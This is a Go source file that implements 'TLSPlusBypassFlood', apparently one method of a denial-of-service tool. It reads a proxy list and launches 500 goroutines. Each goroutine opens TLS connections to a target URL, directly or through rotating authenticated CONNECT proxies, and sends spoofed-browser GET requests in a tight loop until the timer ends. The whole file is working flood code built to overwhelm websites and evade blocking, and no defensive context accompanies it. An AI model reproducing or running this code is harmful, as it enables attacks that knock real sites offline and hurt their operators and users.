package methods

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

var tlsProxies []string // Load proxies from file

func loadTLSProxies() {
	file, err := os.Open("proxy/tlsplusbypass.txt")
	if err != nil {
		return
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") && strings.Contains(line, ":") {
			// Remove http:// or https:// prefix to handle raw user:pass format correctly
			line = strings.TrimPrefix(line, "http://")
			line = strings.TrimPrefix(line, "https://")
			lines = append(lines, line)
		}
	}
	tlsProxies = lines
	fmt.Printf("Loaded %d proxies for TLSPlusBypass\n", len(tlsProxies))
}

// TLSPlusBypassFlood - High Performance Raw Socket Flood (with Proxy support)
func TLSPlusBypassFlood(ctx context.Context, target string, sec int) {
	// Reload proxies on every attack start to pick up changes
	loadTLSProxies()

	u, err := url.Parse(target)
	if err != nil {
		fmt.Printf("Failed to parse URL: %v\n", err)
		return
	}

	host := u.Host
	if !strings.Contains(host, ":") {
		host += ":443"
	}

	fmt.Printf("[%s] TLS+ Bypass (Raw) Attack started on %s for %ds\n",
		time.Now().Format("15:04:05"), target, sec)

	payload := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n",
		u.Path, u.Host)
	payloadBytes := []byte(payload)

	var mu sync.Mutex
	var proxyIndex int = 0
	var proxyUsage int = 0

	for i := 0; i < 500; i++ {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				default:
				}

				var conn net.Conn
				var err error

				if len(tlsProxies) > 0 {
					mu.Lock()
					proxyStr := tlsProxies[proxyIndex]
					proxyUsage++
					if proxyUsage >= 5 {
						proxyUsage = 0
						proxyIndex++
						if proxyIndex >= len(tlsProxies) {
							proxyIndex = 0
						}
					}
					mu.Unlock()

					var proxyAddr string
					var authHeader string

					if strings.Contains(proxyStr, "@") {
						parts := strings.SplitN(proxyStr, "@", 2)
						creds := parts[0]
						proxyAddr = parts[1]
						basicAuth := base64.StdEncoding.EncodeToString([]byte(creds))
						authHeader = fmt.Sprintf("Proxy-Authorization: Basic %s\r\n", basicAuth)
					} else {
						proxyAddr = proxyStr
					}

					conn, err = net.DialTimeout("tcp", proxyAddr, 5*time.Second)
					if err != nil {
						continue
					}

					connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n%s\r\n", host, host, authHeader)
					conn.Write([]byte(connectReq))

					tmp := make([]byte, 12)
					conn.SetReadDeadline(time.Now().Add(5 * time.Second))
					_, err = conn.Read(tmp)
					if err != nil || !strings.Contains(string(tmp), "200") {
						conn.Close()
						continue
					}
					tlsConn := tls.Client(conn, &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         u.Host,
					})
					conn = tlsConn
				} else {
					conn, err = tls.Dial("tcp", host, &tls.Config{
						InsecureSkipVerify: true,
						ServerName:         u.Host,
					})
					if err != nil {
						time.Sleep(100 * time.Millisecond)
						continue
					}
				}

				for {
					select {
					case <-ctx.Done():
						conn.Close()
						return
					default:
					}

					conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
					_, err := conn.Write(payloadBytes)
					if err != nil {
						break
					}
				}
				conn.Close()
			}
		}()
	}

	<-ctx.Done()
	fmt.Printf("[%s] TLS+ Attack finished.\n", time.Now().Format("15:04:05"))
}
